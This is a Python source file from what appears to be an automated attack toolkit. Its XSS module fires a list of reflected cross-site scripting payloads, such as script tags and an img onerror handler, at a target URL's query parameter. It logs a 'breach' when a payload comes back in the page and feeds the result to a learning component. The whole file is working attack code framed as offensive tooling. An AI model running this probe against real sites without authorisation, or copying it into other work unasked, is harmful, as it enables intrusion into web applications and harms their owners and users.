# src/attacks/xss.py — v15.7 — ПОЛНЫЙ
import asyncio
import time
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class XSSModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {
            "attack": "xss",
            "success": False,
            "risk": 7,
            "tested_payloads": [],
            "context_snapshot": options.get("context", {}),
            "timestamp": int(time.time())
        }

        request = options.get('request')
        if not request:
            return result

        payloads = [
            "<script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "\";alert(1);//",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>"
        ]

        self.logger.info(f"XSS → {target}")

        for payload in payloads:
            result["tested_payloads"].append(payload)
            try:
                resp = await request('GET', target, params={"q": payload})
                if resp and payload in resp.text:
                    result.update({
                        "success": True,
                        "vulnerable_payload": payload,
                        "data_leaked": {"reflected": payload}
                    })
                    self.logger.breach(f"XSS: {payload}")
                    if self.brain:
                        self.brain.learn("xss", target, payload, True, resp.text[:300])
                    break
            except Exception as e:
                self.logger.error(f"XSS ошибка: {e}")
                continue

        return result